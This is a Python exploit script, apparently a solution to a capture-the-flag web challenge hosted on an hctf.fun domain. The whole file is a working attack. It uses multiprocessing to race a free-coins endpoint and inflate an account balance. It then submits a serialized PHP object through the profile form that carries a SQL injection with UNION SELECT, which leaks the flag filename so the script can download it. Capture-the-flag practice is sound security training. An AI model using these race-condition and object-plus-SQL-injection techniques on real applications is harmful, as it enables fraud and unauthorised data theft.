import multiprocessing as mp
import requests
import random
import string
import re

BASE_URL = "http://library.uni.hctf.fun"

URL = BASE_URL + "/free.php?do=1"

LOGIN = BASE_URL + "/login.php"

REGISTER = BASE_URL + "/register.php"

BALANCE = BASE_URL + "/transactions.php"

PROFILE = BASE_URL + "/profile.php"

DOWNLOAD = BASE_URL + "/products/{}"

def rand_str(l=10):
	return "".join([random.choice(string.ascii_letters) for _ in range(l)])

def register(user, passwd):
	requests.post(REGISTER, data={'name': user, 'password': passwd})


def get_coins(bar, user, passwd):
	sess = requests.Session()
	sess.post(LOGIN, data={'name': user, 'password': passwd})
	bar.wait()
	sess.get(URL)


def get_balance(user, passwd):
	sess = requests.Session()
	sess.post(LOGIN, data={'name': user, 'password': passwd})
	res = sess.get(BALANCE)

	return int(re.findall("Balance: ([0-9]+)", res.text)[0])

N_WORKER = 4
n = 0
while True:
	n += 1
	user = passwd = rand_str()
	register(user, passwd)
	bar = mp.Barrier(N_WORKER)
	jobs = []
	for i in range(N_WORKER):
		p = mp.Process(target=get_coins, args=(bar, user, passwd))
		jobs.append(p)
		p.start()

	for j in jobs:
		j.join()
	
	balance = get_balance(user, passwd)
	if balance > 500:
		print("Got {} at iteration {}, user {}".format(balance, n, user))
		break
	print(user)


def inject_get_flag(user, passwd):
	sess = requests.Session()
	sess.post(LOGIN, data={'name': user, 'password': passwd})
	sess.post(PROFILE, data={'password': passwd, 'tags': 'a:1:{i:0;O:4:"User":3:{s:5:"table";s:24:"products /*\' or true -- ";s:3:"uid";s:154:"*/ WHERE false UNION SELECT NULL, filename, NULL, NULL, NULL FROM products WHERE name=0x466c61676779204d63466c61676572736f6e20616e642048657220466c6167 -- ";s:3:"obj";O:8:"stdClass":0:{}}} -- }'})
	res = sess.get(BALANCE)
	flag_file = re.findall("#([a-z0-9]+).txt", res.text)[0]
	res = sess.get(DOWNLOAD.format(flag_file + ".txt"))
	return res.text

print(inject_get_flag(user, passwd))
